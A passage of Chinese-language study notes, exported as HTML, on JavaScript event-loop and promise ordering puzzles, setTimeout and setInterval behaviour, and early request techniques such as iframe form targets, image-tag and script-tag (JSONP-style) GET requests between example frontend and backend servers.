style="font-size: 12pt;">    console.log(1);</span></div><div><span style="font-size: 12pt;">},0);</span></div><div><br/></div><div><span style="font-size: 12pt;">new Promise((resolve)=&gt;{</span></div><div><span style="font-size: 12pt;">    console.log(2);</span></div><div><span style="font-size: 12pt;">    resolve();</span></div><div><span style="font-size: 12pt;">}).then(()=&gt;console.log(3));</span></div><div><br/></div><div><span style="font-size: 12pt;">function callMe(){</span></div><div><span style="font-size: 12pt;">    console.log(4);</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">(async ()=&gt;{</span></div><div><span style="font-size: 12pt;">    await callMe();</span></div><div><span style="font-size: 12pt;">    co</span><span style="font-size: 12pt;">nsole.log(5);</span></div><div><span style="font-size: 12pt;">})();</span></div></div><div><br/></div><div><span style="font-size: 12pt;">同步宏任务 =&gt; 异步微任务 =&gt; 异步宏任务</span></div><div><br/></div><div><span style="font-size: 12pt;">答案</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">2</span></div><div><span style="font-size: 12pt;">4</span></div><div><span style="font-size: 12pt;">3</span></div><div><span style="font-size: 12pt;">5</span></div><div><span style="font-size: 12pt;">1</span></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; font-weight: bold;">再一道题</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let v = new Promise(resolve =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(&quot;begin&quot;);</font></div><div><font style="font-size: 12pt;">  resolve(&quot;then&quot;);</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">new Promise(resolve =&gt; {</font></div><div><font style="font-size: 12pt;">  resolve(v);</font></div><div><font style="font-size: 12pt;">}).then((v)=&gt;{</font></div><div><font style="font-size: 12pt;">  console.log(v)</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">new Promise(resolve =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(1);</font></div><div><font style="font-size: 12pt;">  resolve();</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(2);</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(3);</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(4);</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;">// begin-&gt;1-&gt;2-&gt;3-&gt;then-&gt;4</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let v = new Promise(resolve =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(&quot;begin&quot;);</font></div><div><font style="font-size: 12pt;">  resolve(&quot;then&quot;);</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">Promise.resolve(v).then((v)=&gt;{</font></div><div><font style="font-size: 12pt;">  console.log(v)</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">new Promise(resolve =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(1);</font></div><div><font style="font-size: 12pt;">  resolve();</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(2);</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(3);</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(4);</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;">// begin-&gt;1-&gt;then-&gt;2-&gt;3-&gt;4</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">resolve(p) ，p 为 Promise 对象（即 new Promise）时，</span></div><div><br/></div><div><span style="font-size: 12pt;">最好使用 Promise.resolve(p).then()，而不是 new Promise(resolve =&gt; resolve(p)).then() 。</span></div><div><br/></div><div><span style="font-size: 12pt;">第一个 new Promise(resolve =&gt; resolve(p)).then() 会比 Promise.resolve(p).then() 、</span></div><div><br/></div><div><span style="font-size: 12pt;">其它的 new Promise(resolve =&gt; resolve(p)).then() 的 then() 慢两个时序执行。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">类似的（延迟了两个时序才执行</span><span style="font-size: 12pt; color: unset; font-family: unset; font-weight: bold;">）</span></div><div><br/></div><div><a href="https://juejin.cn/post/6936515826514149389" style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 238); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold; text-decoration: underline;">https://juejin.cn/post/6936515826514149389</a></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let p = Promise.resolve(1);</font></div><div><font style="font-size: 12pt;">let p3 = Promise.resolve(p);</font></div><div><font style="font-size: 12pt;">let p4 = new Promise(resolve =&gt; resolve(p));</font></div><div><font style="font-size: 12pt;">p4.then(() =&gt; console.log('promise1'))</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; console.log('promise2'));</font></div><div><font style="font-size: 12pt;">p3.then(() =&gt; console.log('promise3'))</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; console.log('promise4'))</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; console.log('promise5'));</font></div><div><font style="font-size: 12pt;">// promise3</font></div><div><font style="font-size: 12pt;">// promise4</font></div><div><font style="font-size: 12pt;">// promise1</font></div><div><font style="font-size: 12pt;">// promise5</font></div><div><font style="font-size: 12pt;">// promise2</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// p4中指定的回调函数延迟了两个时序执行</font></div></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let p = Promise.resolve(1);</font></div><div><font style="font-size: 12pt;">let p3 = Promise.resolve(p);</font></div><div><font style="font-size: 12pt;">// Promise.resolve(thenable) 等价于如下代码</font></div><div><font style="font-size: 12pt;">let p4 = new Promise(resolve =&gt; {</font></div><div><font style="font-size: 12pt;">    Promise.resolve().then(()=&gt;{</font></div><div><font style="font-size: 12pt;">        p.then(resolve);</font></div><div><font style="font-size: 12pt;">    });</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;">p4.then(() =&gt; console.log('promise1'))</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; console.log('promise2'));</font></div><div><font style="font-size: 12pt;">p3.then(() =&gt; console.log('promise3'))</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; console.log('promise4'))</font></div><div><font style="font-size: 12pt;">  .then(() =&gt; console.log('promise5'));</font></div><div><font style="font-size: 12pt;">// promise3</font></div><div><font style="font-size: 12pt;">// promise4</font></div><div><font style="font-size: 12pt;">// promise1</font></div><div><font style="font-size: 12pt;">// promise5</font></div><div><font style="font-size: 12pt;">// promise2</font></div></div><div><br/></div><div><a href="https://juejin.cn/post/6945319439772434469">https://juejin.cn/post/6945319439772434469</a></div><div><br/></div><div><a href="https://juejin.cn/post/6953452438300917790">https://juejin.cn/post/6953452438300917790</a></div><div><br/></div><div><a href="https://www.zhihu.com/question/453677175/answer/1841325386">https://www.zhihu.com/question/453677175/answer/1841325386</a></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">另一道题</span></span></div><div><br/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(1);</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">const p1 = Promise.resolve(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(2);</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">const p2 = new Promise((resolve, reject) =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(3);</font></div><div><font style="font-size: 12pt;">  resolve();</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">Promise.race([p1, p2]).then(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(4);</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">Promise.all([p1, p2]).then(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(5);</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">console.log(6);</font></div><div><font style="font-size: 12pt;">// 3 6 4 5 1  </font></div></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><hr/><div><br/></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [1].png" type="image/png" data-filename="3.png" width="601"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">诸如 setTimeout(fn, 0) 之类的代码表示将在主线程的堆栈为空时立即执行。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">setTimeout(fn, 0) 在</span><span style="font-size: 12pt;">主线程完成运行后立即运行，这将很有用-将其放在 async 事件循环中，这样它将随后直接运行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var timer = setTimeout(function() {</span></div><div><span style="font-size: 12pt;">    console.log('setTimeout actions.');</span></div><div><span style="font-size: 12pt;">}, 0);</span></div><div><br/></div><div><span style="font-size: 12pt;">console.log('other actions.');</span></div><div><br/></div><div><span style="font-size: 12pt;">// 结果为先打印 other actions. 再打印 setTimeout actions.</span></div></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [42].jpg" type="image/jpeg" data-filename="3.jpg" width="706"/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">console.log('start');</span></div><div><span style="font-size: 12pt;">for (var i = 0; i &lt; 3; i++) {</span></div><div><span style="font-size: 12pt;">    (function (i) {</span></div><div><span style="font-size: 12pt;">         setTimeout(function () {</span></div><div><span style="font-size: 12pt;">              console.log(i);</span></div><div><span style="font-size: 12pt;">          }, 0);</span></div><div><span style="font-size: 12pt;">    })(i);</span></div><div><span style="font-size: 12pt;">}</span></div><div><span style="font-size: 12pt;">console.log('end');</span></div><div><span style="font-size: 12pt;">// 结果为先打印satrt再打印end，最后依次打印 0 1 2 </span></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">指定的时间（或延迟）不是保证的执行时间，而是最短的执行时间（即 &gt;= 执行时间）。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">setInterval() 的时间间隔包括执行其中的代码所花费的时间。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">比方说，代码需要 40毫秒 才能运行 - 最终，该时间间隔仅为 60毫秒。</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">最好使用递归 setTimeout()－这将使两次执行之间的时间间隔保持稳定，不管代码需要执行多长时间。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let i = 1;</font></div><div><font style="font-size: 12pt;">setTimeout(function run() {</font></div><div><font style="font-size: 12pt;">  console.log(i);</font></div><div><font style="font-size: 12pt;">  i++;</font></div><div><font style="font-size: 12pt;">  setTimeout(run, 100);</font></div><div><font style="font-size: 12pt;">}, 100);</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let i = 1;</font></div><div><font style="font-size: 12pt;">setInterval(function run() {</font></div><div><font style="font-size: 12pt;">  console.log(i);</font></div><div><font style="font-size: 12pt;">  i++</font></div><div><font style="font-size: 12pt;">}, 100);</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">发布/订阅模式</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">事件完全可以理解成“信号”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果存在一个“信号中心”，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">某个任务执行完成，就向信号中心“发布”（publish）一个信号，其他任务可以向信号中心“订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这就叫做”发布/订阅模式”（publish-subscribe pattern），又称“观察者模式”（observer pattern）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">AJAX</span></font></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">以支付一块钱为例，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">前端  </span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">span有个占位符是余额</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">form 表单提交action = &quot;服务器路径&quot; method = &quot;请求方法&quot;， 点击type=&quot;submit&quot;按钮 </span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">后台</span> </span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">知道action路径</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">数据库文件</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">（数据库就是文件，表？如 db: 100）</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">替换前端页面的占位符</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">读取</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">数据库</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">文件对应余额的值</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">修改</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">数据库</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">文件（将文件对应db的值修改了）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">设置返回的响应头和响应内容（可以是js，可以是htm，也可以是css）</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">告诉页面成功了</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">结束响应</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [43].jpg" type="image/jpeg" data-filename="3.jpg" width="401"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [44].jpg" type="image/jpeg" data-filename="3.jpg" width="308"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">2005年之前所有网站都是</span><span style="font-size: 12pt; font-weight: bold;">点击返回然后点击刷新才可以显示新数据（用户才知道成功或失败）</span><span style="font-size: 12pt; font-weight: bold;">，form表单一旦提交不管成功或失败一定会自动刷新当前页面，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">当时优化体验的解决方案：</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">一、设置&lt;form&gt;的target属性为&lt;iframe&gt;的name属性值，使用iframe承载刷新</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">&lt;h5&gt;您的账户余额是&lt;span id=&quot;amount&quot;&gt;&amp;&amp;&amp;amount&amp;&amp;&amp;&lt;/span&gt;&lt;/h5&gt;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">&lt;form action=&quot;/pay&quot; method=&quot;post&quot; <b>target=&quot;result&quot;</b>&gt;</font></div><div><font style="font-size: 12pt;">    &lt;input type=&quot;submit&quot; value=&quot;付款&quot;&gt;</font></div><div><font style="font-size: 12pt;">&lt;/form&gt;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">&lt;iframe <b>name=&quot;result&quot;</b> src=&quot;about:blank&quot; frameborder=&quot;0&quot; height=200&gt;&lt;/iframe&gt;</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">二、不用&lt;form&gt;发请求，以下标签</span><span style="font-size: 12pt; font-weight: bold;">都可以发起请求：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">下面所有的标签都不受域名限制，除非访问的域名使用了防盗链技术：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● &lt;a href=XXX&gt;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">&lt;img src=XXX&gt;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">&lt;link href=XXX&gt;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">&lt;a&gt;（</span><span style="font-size: 12pt;">可以发GET请求</span><span style="font-size: 12pt;">，</span><span style="font-size: 12pt;">需要用户点击，</span><span style="font-size: 12pt;">会刷新页面或新开页面</span><span style="font-size: 12pt;">）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">&lt;link&gt;（</span><span style="font-size: 12pt;">可以发GET请求，</span><span style="font-size: 12pt;">只能以 CSS、favicon 的形式展示</span><span style="font-size: 12pt;">）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">&lt;img&gt;</span><span style="font-size: 12pt; font-weight: bold;">制造 GET</span><span style="font-size: 12pt; font-weight: bold;"> 请求（</span><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">只能以图片的形式展示</span></span><span style="font-size: 12pt; font-weight: bold;">）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">img的src属性只能GET不能POST，用onload属性表示请求成功、用onerror属性表示请求失败，最后刷新余额数字（</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">window.location.reload()会刷新整个页面</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">）</span></div><div><font color="#7600D8" style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">img只能知道成功或失败，后端不知道数据</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">前端frank.com代码</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">button.addEventListener('click', (e) =&gt; {</font></div><div><font style="font-size: 12pt;">    let image = document.createElement('img');</font></div><div><font style="font-size: 12pt;">    image.src = '/pay';</font></div><div><font style="font-size: 12pt;">    image.onload = function () { // 响应状态码是 200~299 则表示成功</font></div><div><font style="font-size: 12pt;">        alert('付款成功');</font></div><div><font style="font-size: 12pt;">        amount.innerText = amount.innerText - 1;</font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">    image.onerror = function () { // 响应状态码大于等于 400 则表示失败</font></div><div><font style="font-size: 12pt;">        alert('付款失败');</font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">后端jack.com代码</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">...</span></div><div><font style="font-size: 12pt;">if (path === '/pay') {</font></div><div><font style="font-size: 12pt;">    let amount = fs.readFileSync('./db', 'utf8')</font></div><div><font style="font-size: 12pt;">    amount -= 1</font></div><div><font style="font-size: 12pt;">    fs.writeFileSync('./db', amount)</font></div><div><font style="font-size: 12pt;">    response.setHeader('Content-Type', 'image/jpg')</font></div><div><font style="font-size: 12pt;">    response.statusCode = 200</font></div><div><font style="font-size: 12pt;">    response.write('amount.innerText = ' + amount)</font></div><div><font style="font-size: 12pt;">    response.end()</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; font-weight: bold;">&lt;script&gt;制造 GET</span><span style="font-size: 12pt; font-weight: bold;"> 请求（</span><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">只能以脚本的形式运行</span></span><span style="font-size: 12pt; font-weight: bold;">）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">&lt;script&gt;只能GET，不能POST。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">&lt;script&gt;一定要</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">document.body.appendChild。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">不用返回图片，更快，但是</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">执行</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">请求之后会增加&lt;script&gt;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">&lt;script&gt;请求成功不用写在onload里，只需要让服务器response返回success；</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">前端frank.com代码</span></font></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">window.xxx = function (result) {</font></div><div><font style="font-size: 12pt;">    alert('这是frank写的前端代码')</font></div><div><font style="font-size: 12pt;">    alert('我得到的结果是${result}')</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">button.addEventListener('click', (e) =&gt; {</font></div><div><font style="font-size: 12pt;">    let script = document.createElement('script');</font></div><div><font style="font-size: 12pt;">    script.src = 'http://jack.com:8002/pay?callback=xxx'; </font></div><div><font style="font-size: 12pt;"><font>    document.body.appendChild(script); </font>// 浏览器发起GET请求</font></div><div><font style="font-size: 12pt;"> </font><font style="font-size: 12pt;"><font>   // debugger 添加断点，</font>停住</font></div><div><font style="font-size: 12pt;">    script.onload = function (e) { // 状态码是 200~299 则表示成功</font></div><div><font style="font-size: 12pt;"><font>        e.currentTarget.remove();  // 干掉添加的&lt;script&gt;，</font>&lt;script&gt;<font>还是在内存里</font></font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">    script.onerror = function (e) { // 状态码大于等于 400 则表示失败</font></div><div><font style="font-size: 12pt;"><font><font>        e.currentTarget.remove();   </font>// 干掉添加的&lt;script&gt;，</font>&lt;script&gt;还是在内存里</font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><br/></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">后端jack.com代码</span></font></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">...</span></div><div><font style="font-size: 12pt;">if (path === '/pay') {</font></div><div><font style="font-size: 12pt;">    var amount = fs. readFilesync('./db', 'utf8') // 100</font></div><div><font style="font-size: 12pt;">    